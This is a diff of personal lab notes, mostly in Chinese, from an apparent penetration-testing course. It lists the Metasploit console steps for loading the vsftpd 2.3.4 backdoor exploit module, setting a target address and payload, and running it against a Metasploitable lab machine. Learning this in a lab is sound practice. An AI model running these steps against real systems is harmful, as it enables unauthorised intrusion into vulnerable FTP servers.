@@ -1,6 +1,38 @@
-progress: 5-1
+progress: **
+skip ch5,6(因為需要wifi adapter)
+
 
 wifi adapter recommendation: alfa awus036nha, alfa awus036ach(支援5G)
 
 
-this lecture needs wifi adapter
+在kali中啟動metasploitable
+msfconsole
+
+使用module
+>>use [module name]
+  use exploit/unix/ftp/vsftpd_234_backdoor
+
+
+印出所有選項
+>>show options
+
+
+設定選項
+>>set [選項] [值]
+  set RHOST 10.0.2.8
+
+開始滲透測試
+>>exploit
+
+
+印出所有payload(payload是將會在target電腦上執行的攻擊軟體)
+>>show payloads
+
+設定payload
+>>set PAYLOAD [想要設定的payload]
+
+
+
+啟動metasploitable和kali,並在kali的瀏覽器內輸入metsploitable的ip(可用ifconfig查)
+重啟伺服器 @mmetasploitable
+sudo /etc/init.d/apache2 restart
